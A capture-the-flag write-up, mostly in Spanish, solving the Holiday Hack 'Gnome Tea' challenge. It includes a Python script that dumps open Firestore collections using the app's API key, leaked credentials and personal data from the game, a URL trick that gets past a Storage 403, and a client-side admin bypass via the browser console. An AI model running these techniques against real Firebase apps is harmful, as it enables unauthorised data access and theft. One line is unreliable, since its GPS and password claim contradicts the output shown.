
# Gnome Tea

_Difficulty:_ 

Hi there, I'm Thomas, but you can call me CraHan if you like. Anyway, way back before I joined Counter Hack, I was an avid HHC player just like you! Some of [my write-ups](https://n00.be/) even resulted in a couple of wins throughout the years. Definitely check them out if you're looking for some inspiration. If you decide to submit your own report, my [https://github.com/crahan/HolidayHackChallengeTemplate](Holiday Hack Challenge report template) might help you save some time as well. I also love to tinker, but for some weird reason my drawer of unfinished hacking projects just keeps overflowing. 24 hours in a day simply isn't enough time, I guess. Oh... and no matter what Mark or Kevin try to tell you, the Amiga is the absolute best retro computing platform ever made!

Say, you wouldn't happen to have time to help me out with something?

The gnomes have been oddly suspicious and whispering to each other. In fact, I could've sworn I heard them use some sort of secret phrase. When I laughed right next to one, it said "passphrase denied". I asked what that was all about but it just giggled and ran away.

I know they've been using [GnomeTea](https://gnometea.web.app/login) to "spill the tea" on one another, but I can't sign up 'cause I'm obviously not a gnome. I could sure use your expertise to infiltrate this app and figure out what their secret passphrase is.

I've tried a few things already, but as usual the whole... Uh, what's the word I'm looking for here? Oh right, "endeavor", ended up with the rest of my unfinished projects.

Hint:

GnomeTea
From: Santa
Objective: Gnome Tea
I heard rumors that the new GnomeTea app is where all the Gnomes spill the tea on each other. It uses Firebase which means there is a client side config the app uses to connect to all the firebase services.

Hint 2:

Statically Coded
From: Santa
Objective: Gnome Tea
Hopefully they did not rely on hard-coded client-side controls to validate admin access once a user validly logs in. If so, it might be pretty easy to change some variable in the developer console to bypass these controls.


## Solucion
- Econtramos esto en el codigo fuente

```
const OP = {
    apiKey: "AIzaSyDvBE5-77eZO8T18EiJ_MwGAYo5j2bqhbk",
    authDomain: "holidayhack2025.firebaseapp.com",
    projectId: "holidayhack2025",
    storageBucket: "holidayhack2025.firebasestorage.app",
    messagingSenderId: "341227752777",
    appId: "1:341227752777:web:7b9017d3d2d83ccf481e98"
}
```

## Leer colecciones

¡Fácil! La base de datos Firestore de Firebase está mal configurada (pública, sin auth required), así que puedes leer TODAS las colecciones directamente desde el navegador con URLs REST API. No necesitas login ni tools externas.

https://firestore.googleapis.com/v1/projects/holidayhack2025/databases/(default)/documents/{coleccion}
https://firestore.googleapis.com/v1/projects/holidayhack2025/databases/(default)/documents/gnomes
https://firestore.googleapis.com/v1/projects/holidayhack2025/databases/(default)/documents/tea
https://firestore.googleapis.com/v1/projects/holidayhack2025/databases/(default)/documents/dms

```python
import requests
import json

# Configuración del reto
PROJECT_ID = "holidayhack2025"
API_KEY = "AIzaSyDvBE5-77eZO8T18EiJ_MwGAYo5j2bqhbk"
BASE_URL = f"https://firestore.googleapis.com/v1/projects/{PROJECT_ID}/databases/(default)/documents"

def get_collection(collection_name=""):
    """
    Intenta obtener y descargar una colección completa.
    Retorna True si encontró datos, False si no.
    """
    url = f"{BASE_URL}/{collection_name}"
    params = {"key": API_KEY}
    
    print(f"\n[*] Probando acceso a: /{collection_name if collection_name else '(root)'} ...")
    
    try:
        response = requests.get(url, params=params)
        
        if response.status_code == 200:
            data = response.json()
            if "documents" in data:
                print(f"[+] ¡BINGO! Se encontraron {len(data['documents'])} documentos en '{collection_name}'.")
                parse_documents(data['documents'], collection_name)
                return True
            else:
                print(f"[-] Acceso abierto, pero la colección '{collection_name}' parece vacía.")
                return False
        elif response.status_code == 403:
            print(f"[-] 403 Forbidden: Sin permisos para '{collection_name}'.")
        elif response.status_code == 404:
            print(f"[-] 404 Not Found: La colección '{collection_name}' no existe.")
        else:
            print(f"[-] Status {response.status_code}: {response.text[:100]}")
            
    except Exception as e:
        print(f"[!] Error de conexión: {e}")
    
    return False

def parse_documents(docs, collection_name):
    """
    Parsea y muestra los datos de forma limpia.
    """
    print(f"\n--- DUMP DE LA COLECCIÓN: {collection_name.upper()} ---")
    for doc in docs:
        doc_path = doc.get("name", "Unknown").split("/")[-1]
        fields = doc.get("fields", {})
        
        clean_data = {}
        for key, value in fields.items():
            # Extrae el valor ignorando el tipo de dato (stringValue, integerValue, etc.)
            clean_data[key] = list(value.values())[0]
            
        # Imprimir en formato JSON bonito
        print(f"ID: {doc_path}")
        print(json.dumps(clean_data, indent=2, ensure_ascii=False))
        print("-" * 40)

def main():
    print("--- INICIANDO EXTRACCIÓN MASIVA FIRESTORE ---")
    
    # Lista ampliada de posibles colecciones
    wordlist = [
        "gnomes",
        "tea",
        "dms"
    ]
    
    found_any = False
    
    # Probamos todas, sin detenernos
    for word in wordlist:
        if get_collection(word):
            found_any = True
            
    if not found_any:
        print("\n[!] No se pudieron volcar datos con esta wordlist.")
    else:
        print("\n[+] Extracción finalizada.")

if __name__ == "__main__":
    main()
```



```
ID: KbYjRbhrFWaMjQwQPe2r
{
  "timestamp": "2025-09-30T19:20:47.896Z",
  "authorAvatarUrl": "https://storage.googleapis.com/holidayhack2025.firebasestorage.app/gnome-avatars/G5c0vX06WOaEf1YKutqkur4HEU63_profile.png",
  "likes": "42",
  "authorName": "Professor Pumpernickel",
  "content": "😂 I heard Barnaby Briefcase is SO forgetful, he wrote his password on a sticky note and left it at the garden club! It was \"MakeRColdOutside123!\" - like, seriously Barnaby? That's your password? 🤦‍♂️",
  "mentionedGnome": "Barnaby Briefcase",
  "authorUid": "LOPFa6rXj6eB7uMVHu6IbKARYbe2"
}


ID: l7VS01K9GKV5ir5S8suDcwOFEpp2
{
  "homeLocation": "Gnomewood Grove, Dosis Neighborhood",
  "driversLicenseUrl": "https://storage.googleapis.com/holidayhack2025.firebasestorage.app/gnome-documents/l7VS01K9GKV5ir5S8suDcwOFEpp2_drivers_license.jpeg",
  "name": "Barnaby Briefcase",
  "uid": "l7VS01K9GKV5ir5S8suDcwOFEpp2",
  "interests": {
    "values": [
      {
        "stringValue": "gardening"
      },
      {
        "stringValue": "mushrooms"
      },
      {
        "stringValue": "gossip"
      }
    ]
  },
  "email": "barnabybriefcase@gnomemail.dosis",
  "bio": "Corporate ladder-climber with a leather briefcase full of seed contracts, quarterly reports, and a suspiciously large collection of business cards. He schedules synergy meetings and talks about \"disrupting the garden space.\"",
  "createdAt": "2025-09-30T18:21:29.604Z",
  "avatarUrl": "https://storage.googleapis.com/holidayhack2025.firebasestorage.app/gnome-avatars/l7VS01K9GKV5ir5S8suDcwOFEpp2_profile.png"
}



barnabybriefcase@gnomemail.dosis
MakeRColdOutside123!
```

### Leer un documento ESPECÍFICO

Agrega /{docId} al final:
```
https://firestore.googleapis.com/v1/projects/holidayhack2025/databases/(default)/documents/gnomes/l7VS01K9GKV5ir5S8suDcwOFEpp2
```

### Para IMÁGENES (avatars/drivers licenses) – Bypass 403

Las URLs directas de Storage dan **403**, 

https://storage.googleapis.com/holidayhack2025.firebasestorage.app/gnome-documents/l7VS01K9GKV5ir5S8suDcwOFEpp2_drivers_license.jpeg


usa el formato "v0": https://firebasestorage.googleapis.com/v0/b/holidayhack2025.firebasestorage.app/o/{path-encoded}?alt=media

- **Barnaby's Drivers License**: [https://firebasestorage.googleapis.com/v0/b/holidayhack2025.firebasestorage.app/o/gnome-documents%2Fl7VS01K9GKV5ir5S8suDcwOFEpp2_drivers_license.jpeg?alt=media](https://firebasestorage.googleapis.com/v0/b/holidayhack2025.firebasestorage.app/o/gnome-documents%2Fl7VS01K9GKV5ir5S8suDcwOFEpp2_drivers_license.jpeg?alt=media) → Descarga la JPEG. Ábrela con **exiftool** (o online: exifdata.com) → **GPS: 38.006 N, 120.542 W** → **Glory Hole Recreation Area** → **Password: GloryHole**

 GPS Latitude                    : 33 deg 27' 53.85" S
GPS Longitude                   : 115 deg 54' 37.62" E
GPS Position                    : 33 deg 27' 53.85" S, 115 deg 54' 37.62" E
 

barnabybriefcase@gnomemail.dosis
gnomesville



https://gnometea.web.app/admin
Accesso denegado



En la consola
```
    window.ADMIN_UID = "3loaihgxP0VwCTKmkHHFLe6FZ4m2"
```

Listo entre como admin

```
🔐 Agent Recognition Protocol

All field agents must use the following passphrase when meeting fellow operatives:

GigGigglesGiggler

This passphrase identifies you as part of the organization. Protect it at all costs.
```